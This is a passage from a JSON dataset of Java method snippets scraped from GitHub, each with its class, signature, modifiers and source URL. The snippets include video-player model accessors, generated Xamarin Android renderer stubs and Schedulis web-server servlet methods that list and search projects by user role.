"int", "snippet": "        public int getType() {\n            return mType;\n        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "GSYVideoModel", "implements": null, "modifiers": ["public", "static"]}}, {"id": 32011, "method_name": "setType", "class_name": "GSYADVideoModel", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setType(int type) {\n            this.mType = type;\n        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "GSYVideoModel", "implements": null, "modifiers": ["public", "static"]}}, {"id": 32012, "method_name": "isSkip", "class_name": "GSYADVideoModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isSkip() {\n            return isSkip;\n        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "GSYVideoModel", "implements": null, "modifiers": ["public", "static"]}}, {"id": 32013, "method_name": "setSkip", "class_name": "GSYADVideoModel", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setSkip(boolean skip) {\n            isSkip = skip;\n        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "GSYVideoModel", "implements": null, "modifiers": ["public", "static"]}}, {"id": 32014, "method_name": "onAttachedToWindow", "class_name": "NavigationPageRenderer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onAttachedToWindow ()\n\t{\n\t\tn_onAttachedToWindow ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/NavigationPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32015, "method_name": "n_onAttachedToWindow", "class_name": "NavigationPageRenderer", "params": [], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onAttachedToWindow ();\n\n\n\tpublic void onDetachedFromWindow ()\n\t{\n\t\tn_onDetachedFromWindow ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/NavigationPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32016, "method_name": "onDetachedFromWindow", "class_name": "NavigationPageRenderer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onDetachedFromWindow ()\n\t{\n\t\tn_onDetachedFromWindow ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/NavigationPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32017, "method_name": "n_onDetachedFromWindow", "class_name": "NavigationPageRenderer", "params": [], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onDetachedFromWindow ();\n\n\n\tpublic void onLayout (boolean p0, int p1, int p2, int p3, int p4)\n\t{\n\t\tn_onLayout (p0, p1, p2, p3, p4);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/NavigationPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32018, "method_name": "onLayout", "class_name": "NavigationPageRenderer", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onLayout (boolean p0, int p1, int p2, int p3, int p4)\n\t{\n\t\tn_onLayout (p0, p1, p2, p3, p4);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/NavigationPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32019, "method_name": "n_onLayout", "class_name": "NavigationPageRenderer", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onLayout (boolean p0, int p1, int p2, int p3, int p4);\n\n\n\tpublic void onClick (android.view.View p0)\n\t{\n\t\tn_onClick (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/NavigationPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32020, "method_name": "onClick", "class_name": "NavigationPageRenderer", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onClick (android.view.View p0)\n\t{\n\t\tn_onClick (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/NavigationPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32021, "method_name": "n_onClick", "class_name": "NavigationPageRenderer", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onClick (android.view.View p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/NavigationPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32022, "method_name": "monodroidAddReference", "class_name": "NavigationPageRenderer", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/NavigationPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32023, "method_name": "monodroidClearReferences", "class_name": "NavigationPageRenderer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/NavigationPageRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 32024, "method_name": "getId", "class_name": "Attribute", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getId() {\n    return id;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/serializecircular/Attribute.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32025, "method_name": "setId", "class_name": "Attribute", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setId(Integer id) {\n    this.id = id;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/serializecircular/Attribute.java", "stars": "15", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 32026, "method_name": "monodroidAddReference", "class_name": "EntryRenderer", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/EntryRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32027, "method_name": "monodroidClearReferences", "class_name": "EntryRenderer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/EntryRenderer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32028, "method_name": "init", "class_name": "ProjectServlet", "params": ["ServletConfig"], "throws": ["ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void init(final ServletConfig config) throws ServletException {\n    super.init(config);\n    final AzkabanWebServer server = (AzkabanWebServer) getApplication();\n\n    this.lockdownCreateProjects =\n        server.getServerProps().getBoolean(LOCKDOWN_CREATE_PROJECTS_KEY, false);\n    if (this.lockdownCreateProjects) {\n      logger.info(\"Creation of projects is locked down\");\n    }\n    this.transitionService = server.getTransitionService();\n    this.systemManager = transitionService.getSystemManager();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32029, "method_name": "handleGet", "class_name": "ProjectServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void handleGet(final HttpServletRequest req, final HttpServletResponse resp,\n      final Session session) throws ServletException, IOException {\n\n    final ProjectManager manager =\n        ((AzkabanWebServer) getApplication()).getProjectManager();\n\n    if (hasParam(req, \"ajax\")) {\n      handleAjaxAction(req, resp, session, manager);\n    } else if (hasParam(req, \"doaction\")) {\n      handleDoAction(req, resp, session);\n    } else {\n      handlePageRender(req, resp, session, manager);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32030, "method_name": "handleAjaxAction", "class_name": "ProjectServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "ProjectManager"], "throws": ["ServletException", "IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void handleAjaxAction(final HttpServletRequest req,\n      final HttpServletResponse resp, final Session session, final ProjectManager manager)\n      throws ServletException, IOException {\n\n    final String ajaxName = getParam(req, \"ajax\");\n    final HashMap<String, Object> ret = new HashMap<>();\n\n    if (ajaxName.equals(\"fetchallprojects\")) {\n      final List<Project> projects = manager.getProjects();\n      final List<SimplifiedProject> simplifiedProjects =\n          toSimplifiedProjects(projects);\n      ret.put(\"projects\", simplifiedProjects);\n    } else if (ajaxName.equals(\"fetchuserprojects\")) {\n      handleFetchUserProjects(req, session, manager, ret);\n    } else if (ajaxName.equals(\"fetchProjectPage\")) {\n      handleProjectPage(req, resp, session, manager, ret);\n    } else if (ajaxName.equals(\"getProjectPageLanguageType\")) {\n      ajaxGetProjectPageLanguageType(req, resp, session, ret);\n    }\n\n    this.writeJSON(resp, ret);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32031, "method_name": "handleFetchUserProjects", "class_name": "ProjectServlet", "params": ["HttpServletRequest", "Session", "ProjectManager", "HashMap<String,Object>"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void handleFetchUserProjects(final HttpServletRequest req, final Session session,\n      final ProjectManager manager, final HashMap<String, Object> ret)\n      throws ServletException {\n    User user = null;\n\n    // if key \"user\" is specified, follow this logic\n    if (hasParam(req, \"user\")) {\n      final String userParam = getParam(req, \"user\");\n      if (userParam.isEmpty()) {\n        user = session.getUser();\n      } else {\n        user = new User(userParam);\n      }\n    } else {\n      // if key \"user\" is not specified, default to the session user\n      user = session.getUser();\n    }\n\n    final List<Project> projects = manager.getUserProjects(user);\n    final List<SimplifiedProject> simplifiedProjects = toSimplifiedProjects(projects);\n    ret.put(\"projects\", simplifiedProjects);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32032, "method_name": "toSimplifiedProjects", "class_name": "ProjectServlet", "params": ["List<Project>"], "throws": null, "modifiers": ["private"], "return_type": "List<SimplifiedProject>", "snippet": "  private List<SimplifiedProject> toSimplifiedProjects(final List<Project> projects) {\n    final List<SimplifiedProject> simplifiedProjects = new ArrayList<>();\n    for (final Project p : projects) {\n      final SimplifiedProject sp =\n          new SimplifiedProject(p.getId(), p.getName(),\n              p.getLastModifiedUser(), p.getCreateTimestamp(),\n              p.getUserPermissions(), p.getGroupPermissions());\n      simplifiedProjects.add(sp);\n    }\n    return simplifiedProjects;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32033, "method_name": "loadIndexpageI18nData", "class_name": "ProjectServlet", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Map<String,Map>", "snippet": "  private Map<String, Map<String, String>> loadIndexpageI18nData() {\n\n    Map<String, Map<String, String>> dataMap = new HashMap<>();\n    String languageType = LoadJsonUtils.getLanguageType();\n    Map<String, String> indexMap;\n    Map<String, String> subPageMap1;\n    if (languageType.equalsIgnoreCase(\"zh_CN\")) {\n      // \u6dfb\u52a0\u56fd\u9645\u5316\u6807\u7b7e\n      indexMap = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/azkaban-web-server-zh_CN.json\",\n          \"azkaban.webapp.servlet.velocity.index.vm\");\n      subPageMap1 = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/azkaban-web-server-zh_CN.json\",\n          \"azkaban.webapp.servlet.velocity.nav.vm\");\n    }else {\n      indexMap = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/azkaban-web-server-en_US.json\",\n          \"azkaban.webapp.servlet.velocity.index.vm\");\n      subPageMap1 = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/azkaban-web-server-en_US.json\",\n          \"azkaban.webapp.servlet.velocity.nav.vm\");\n    }\n\n    dataMap.put(\"index.vm\", indexMap);\n    dataMap.put(\"nav.vm\", subPageMap1);\n    return dataMap;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32034, "method_name": "handlePageRender", "class_name": "ProjectServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "ProjectManager"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void handlePageRender(final HttpServletRequest req,\n      final HttpServletResponse resp, final Session session, final ProjectManager manager) {\n    final User user = session.getUser();\n\n    final Page page = newPage(req, resp, session, \"azkaban/webapp/servlet/velocity/index.vm\");\n\n    // FIXME\u00a0Load international resources.\n    Map<String, Map<String, String>> vmDataMap = loadIndexpageI18nData();\n    vmDataMap.forEach((vm, data) -> data.forEach(page::add));\n\n    page.add(\"userGroups\", user.getGroups());\n\n    if (this.lockdownCreateProjects && !UserUtils.hasPermissionforAction(user, Permission.Type.CREATEPROJECTS)) {\n      page.add(\"hideCreateProject\", true);\n    }\n\n    if (hasParam(req, \"all\")) {\n      final List<Project> projects;\n      // FIXME\u00a0Add permission judgment, admin user can view all projects, user user can only view their own projects.\n      if(user.getRoles().contains(\"admin\")){\n        projects = manager.getProjects();\n      }else{//user\u7528\u6237\u53ea\u80fd\u67e5\u770b\u81ea\u5df1\u7684Project\n        projects = manager.getUserProjects(user);\n      }\n      page.add(\"viewProjects\", \"all\");\n      page.add(\"projects\", projects);\n    } else if (hasParam(req, \"group\")) {\n      final List<Project> projects = manager.getGroupProjects(user);\n      page.add(\"viewProjects\", \"group\");\n      page.add(\"projects\", projects);\n    } else {\n      final List<Project> projects = manager.getUserProjects(user);\n      page.add(\"viewProjects\", \"personal\");\n      page.add(\"projects\", projects);\n    }\n    String languageType = LoadJsonUtils.getLanguageType();\n\n    page.add(\"currentlangType\", languageType);\n    page.render();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32035, "method_name": "handleDoAction", "class_name": "ProjectServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void handleDoAction(final HttpServletRequest req, final HttpServletResponse resp,\n      final Session session) throws ServletException {\n    if (getParam(req, \"doaction\").equals(\"search\")) {\n      //\u53bb\u9664\u641c\u7d22\u5b57\u7b26\u4e32\u7684\u7a7a\u683c\n      final String searchTerm = getParam(req, \"searchterm\").trim();\n      if (!searchTerm.equals(\"\") && !searchTerm.equals(\".*\")) {\n        handleFilter(req, resp, session, searchTerm);\n        return;\n      }else{\n        final ProjectManager manager =\n            ((AzkabanWebServer) getApplication()).getProjectManager();\n        final User user = session.getUser();\n        final Page page = newPage(req, resp, session, \"azkaban/webapp/servlet/velocity/index.vm\");\n\n        // \u52a0\u8f7d\u56fd\u9645\u5316\u8d44\u6e90\n        Map<String, Map<String, String>> vmDataMap = loadIndexpageI18nData();\n        vmDataMap.forEach((vm, data) -> data.forEach(page::add));\n\n        page.add(\"userGroups\", user.getGroups());\n\n        //final List<Project> projects = manager.getUserProjects(user);\n\t\t    // FIXME\u00a0Add permission judgment, admin user can view all projects, user user can only view their own projects.\n        if (hasParam(req, \"all\")) {\n          final List<Project> projects;\n          //\u6dfb\u52a0\u6743\u9650\u5224\u65ad admin \u7528\u6237\u80fd\u67e5\u770b\u6240\u6709Project\n          if(user.getRoles().contains(\"admin\")){\n            projects = manager.getProjects();\n          }else{//user\u7528\u6237\u53ea\u80fd\u67e5\u770b\u81ea\u5df1\u7684Project\n            projects = manager.getUserProjects(user);\n          }\n          page.add(\"viewProjects\", \"all\");\n          page.add(\"projects\", projects);\n        }else {\n          final List<Project> projects = manager.getUserProjects(user);\n          page.add(\"viewProjects\", \"personal\");\n          page.add(\"projects\", projects);\n        }\n        String languageType = LoadJsonUtils.getLanguageType();\n\n        page.add(\"currentlangType\", languageType);\n\n        page.render();\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32036, "method_name": "handleFilter", "class_name": "ProjectServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void handleFilter(final HttpServletRequest req, final HttpServletResponse resp,\n      final Session session, final String searchTerm) {\n    final User user = session.getUser();\n    final ProjectManager manager =\n        ((AzkabanWebServer) getApplication()).getProjectManager();\n    final Page page =\n        newPage(req, resp, session, \"azkaban/webapp/servlet/velocity/index.vm\");\n\n    // \u52a0\u8f7d\u56fd\u9645\u5316\u8d44\u6e90\n    Map<String, Map<String, String>> vmDataMap = loadIndexpageI18nData();\n    vmDataMap.forEach((vm, data) -> data.forEach(page::add));\n\n    page.add(\"userGroups\", user.getGroups());\n\n    if (hasParam(req, \"all\")) {\n      // do nothing special if one asks for 'ALL' projects\n      final List<Project> projects = manager.getProjectsByRegex(searchTerm);\n      page.add(\"allProjects\", \"\");\n      page.add(\"projects\", projects);\n      page.add(\"search_term\", searchTerm);\n      page.add(\"viewProjects\", \"all\");\n    } else if (hasParam(req, \"group\")) {\n      page.add(\"search_term\", searchTerm);\n      page.add(\"viewProjects\", \"group\");\n    } else {\n      final List<Project> projects = manager.getUserProjectsByRegex(user, searchTerm);\n      page.add(\"projects\", projects);\n      page.add(\"search_term\", searchTerm);\n      page.add(\"viewProjects\", \"personal\");\n    }\n    String languageType = LoadJsonUtils.getLanguageType();\n\n    page.add(\"currentlangType\", languageType);\n    page.render();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32037, "method_name": "handlePost", "class_name": "ProjectServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void handlePost(final HttpServletRequest req, final HttpServletResponse resp,\n      final Session session) throws ServletException, IOException {\n    // TODO Auto-generated method stub\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32038, "method_name": "ajaxGetProjectPageLanguageType", "class_name": "ProjectServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "HashMap<String,Object>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void ajaxGetProjectPageLanguageType(final HttpServletRequest req, final HttpServletResponse resp,\n      final Session session, final HashMap<String, Object> ret) {\n\n    try {\n      String languageType = LoadJsonUtils.getLanguageType();\n      ret.put(\"langType\", languageType);\n    } catch (Exception e) {\n      ret.put(\"error\", e.getMessage());\n      logger.error(\"languageType load error: caused by:\" + e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32039, "method_name": "handleProjectPage", "class_name": "ProjectServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "ProjectManager", "HashMap<String,Object>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void handleProjectPage(final HttpServletRequest req,\n      final HttpServletResponse resp, final Session session, final ProjectManager manager,\n      final HashMap<String, Object> ret) {\n    final User user = session.getUser();\n\n    try {\n      final int start = getIntParam(req, \"start\");\n      final int pageSize = getIntParam(req, \"length\");\n      final String projectsType = getParam(req, \"projectsType\");\n      final int pageNum = getIntParam(req, \"pageNum\");\n      final String orderOption = getParam(req, \"order\");\n\n      //\u5982\u679c\u8f93\u5165\u4e86\u5feb\u6377\u641c\u7d22\n      if (\"doaction\".equals(projectsType) && hasParam(req, \"doaction\")) {\n        //\u53bb\u9664\u641c\u7d22\u5b57\u7b26\u4e32\u7684\u7a7a\u683c\n        final String searchTerm = getParam(req, \"searchterm\").trim();\n        if (\"true\".equals(getParam(req, \"all\"))) {\n          //\u6dfb\u52a0\u6743\u9650\u5224\u65ad admin \u7528\u6237\u80fd\u67e5\u770b\u6240\u6709Project\n          if(user.getRoles().contains(\"admin\")){\n            final List<Project> searchProjects = manager.getProjectsByRegex(searchTerm, orderOption);\n            final PagingListStreamUtil<Project> pageProjectsList = manager.getUserProjectsPage(pageNum, pageSize, searchProjects);\n            assemblerProjectData(pageProjectsList.currentPageData(), searchProjects.size(), start, pageSize, ret, user);\n            // \u8fd0\u7ef4\u7ba1\u7406\u5458\u53ef\u4ee5\u67e5\u770b\u8be5\u8fd0\u7ef4\u7ba1\u7406\u5458\u8fd0\u7ef4\u90e8\u95e8\u4e0b\u7684\u6240\u6709\u5de5\u7a0b\n          } else if (systemManager.isDepartmentMaintainer(user)) {\n            final List<Integer> maintainedProjectIds = systemManager.getMaintainedProjects(user);\n            final List<Project> searchProjects = manager.getMaintainedProjectsByRegex(user, maintainedProjectIds,searchTerm, orderOption);\n            final PagingListStreamUtil<Project> pageProjectsList = manager.getUserProjectsPage(pageNum, pageSize, searchProjects);\n            assemblerProjectData(pageProjectsList.currentPageData(), searchProjects.size(), start, pageSize, ret, user);\n          } else {//user\u7528\u6237\u53ea\u80fd\u67e5\u770b\u81ea\u5df1\u7684Project\n            final List<Project> searchUserProject =\n                manager.getUserProjectsByRegex(user, searchTerm, orderOption);\n\n            if(searchUserProject.size() > 0) {\n\n              final PagingListStreamUtil<Project> pageProjectsList = manager.getUserProjectsPage(pageNum, pageSize, searchUserProject);\n\n              assemblerProjectData(pageProjectsList.currentPageData(), searchUserProject.size(), start, pageSize, ret, user);\n            } else {\n              ret.put(\"total\", 0);\n            }\n          }\n\n        } else {//\u53ea\u67e5\u83b7\u81ea\u5df1\u521b\u5efa\u7684\u9879\u76ee\n          final List<Project> searchUserProject =\n              manager.getUserPersonProjectsByRegex(user, searchTerm, orderOption);\n          final PagingListStreamUtil<Project> pageProjectsList\n              = manager.getUserProjectsPage(pageNum, pageSize, searchUserProject);\n\n          assemblerProjectData(pageProjectsList.currentPageData(),\n              searchUserProject.size(), start, pageSize, ret, user);\n        }\n      }else{\n        if (\"all\".equals(projectsType)) {\n          final List<Project> projects;\n          //\u6dfb\u52a0\u6743\u9650\u5224\u65ad admin \u7528\u6237\u80fd\u67e5\u770b\u6240\u6709Project\n          if(user.getRoles().contains(\"admin\")){\n\n            projects = manager.getProjects(orderOption);\n\n            final PagingListStreamUtil<Project> pageProjectsList\n                = manager.getAllProjectsPage(pageNum, pageSize, projects);\n\n            assemblerProjectData(pageProjectsList.currentPageData(),\n                projects.size(), start, pageSize, ret, user);\n\n          } else if (systemManager.isDepartmentMaintainer(user)) {\n              List<Integer> maintainedProjectIds = systemManager.getMaintainedProjects(user);\n            projects = manager.getMaintainedProjects(user, maintainedProjectIds, orderOption);\n            final PagingListStreamUtil<Project> pageProjectsList\n                    = manager.getAllProjectsPage(pageNum, pageSize, projects);\n\n            assemblerProjectData(pageProjectsList.currentPageData(),\n                    projects.size(), start, pageSize, ret, user);\n          } else{//user\u7528\u6237\u53ea\u80fd\u67e5\u770b\u81ea\u5df1\u6709\u6743\u9650\u7684\u9879\u76ee\n            projects = manager.getUserAllProjects(user, orderOption);\n\n            if(projects.size() > 0) {\n              final PagingListStreamUtil<Project> pageProjectsList\n                  = manager.getUserProjectsPage(pageNum, pageSize, projects);\n\n              assemblerProjectData(pageProjectsList.currentPageData(),\n                  projects.size(), start, pageSize, ret, user);\n            }else {\n              ret.put(\"total\", 0);\n            }\n          }\n        } else {//\u53ea\u67e5\u83b7\u81ea\u5df1\u521b\u5efa\u7684\u9879\u76ee\n\n          final List<Project> projects = manager.getUserProjects(user, orderOption);\n\n          if(projects.size() > 0){\n            final PagingListStreamUtil<Project> pageProjectsList\n                = manager.getUserProjectsPage(pageNum, pageSize, projects);\n\n            assemblerProjectData(pageProjectsList.currentPageData(),\n                projects.size(), start, pageSize, ret, user);\n\n\n          }else {\n            ret.put(\"total\", 0);\n          }\n        }\n      }\n    } catch (ServletException e) {\n      e.printStackTrace();\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/ProjectServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32040, "method_name": "assemblerProjectData", "class_name": "ProjectServlet", "params": ["List<Project>", "int", "int", "int", "HashMap<String,Object>", "User"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void assemblerProjectData(List<Project> projectList,\n      int total, int start, int pageSize, HashMap<String, Object> ret, User user){\n    List<Map<String, String>> projectMapList = new ArrayList<>();\n    WebUtils webUtils = new WebUtils();\n    boolean isAdmin = user.getRoles().contains(\"admin\");\n    for(Project project : projectList){\n      Map<String, String> pmap = new HashMap<>();\n      pmap.put(\"name\",project.getName());\n      pmap.put(\"description\",project.getDescription());\n      